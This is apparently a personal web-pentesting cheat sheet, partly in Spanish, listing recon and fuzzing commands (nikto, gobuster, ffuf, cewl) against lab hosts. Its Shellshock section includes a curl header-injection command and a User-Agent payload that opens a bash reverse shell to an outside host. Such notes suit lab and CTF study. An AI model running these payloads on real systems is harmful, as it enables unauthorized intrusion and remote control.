---
title: initial methodology
category: web
order: 1
---

## 1. fingerprinting
## 2. fuzzing
## 3. html analyzis
## 4. check
* what webserver?
* what backend?
* what methods can use?
* any link or hints in html source?
* any admin panel?
* default credentials?
* hostname change anything?


# 1 Finerprinting
---
## nikto
```
nikto -C all -h http://IP
```
```
nikto -h $host  -p $puerto
```

## httprint
  ```
  httprint -h www1.example.com -s signatures.txt
  ```

## whatweb
```
whatweb http://nop.sh
```

## WAFW00F

  allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website.

  https://github.com/EnableSecurity/wafw00f

## banner grabbing with nc
  ```
  nc 192.168.0.10 80
  GET / HTTP/1.1
  Host: 192.168.0.10
  User-Agent: Mozilla/4.0
  Referrer: www.example.com
  <enter>
  <enter>
  ```

# 2. Fuzzing
---
## DirB
```
dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
```
## ffuf
```
ffuf -u http://10.10.10.171/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -o results.txt
```
## GoBuster
```
 gobuster dir -f -r -k   --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://10.10.10.56:80
 ```
 ```
gobuster dir -f -r -k   --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,.html -u http://10.10.10.56:80/cgi-bin/
```

## wfuzz
* fuzz - /usr/share/wfuzz/wordlist/

## Lists
* SecList - /usr/share/seclists/
* DirB - /usr/share/dirb/wordlists/
* fuzz - /usr/share/wfuzz/wordlist/


# 3. html analysis
---

## linkfinder
 busca links en .js files

## html2text
html -> texto leible


## cewl
```
cewl http://192.168.168.168/index.html -m 2 -w cewl.lst
```

# VARIOS
---


## shellshock

vuln en apache con mod_cgi, le apendeas gilada a bash
podes tener en otras cosas que no sean apache tipo webmin

### Apache
1. encontrar /cgi-bin/
2. encontrar el archivo ahi
3. curl -H "X-Frame-Options: () { :;};echo;echo gato" 10.10.10.56/cgi-bin/user.sh
**webmin reverse shellshock shell**
```
User-Agent: () {:;}; bash  -i >& /dev/tcp/10.10.15.1/1337 0>&1
```


## Heartbleed
TODO


## download web with httrack
```
httrack partidopirata.com.ar
```

## WEBDAV

**davtest**
  ```
  davtest –url http://(target IP) – will display what is executable
  ```
**cadaver**
  ```
  cadaver http://(target IP), then run “ls” to list directories found
  ```
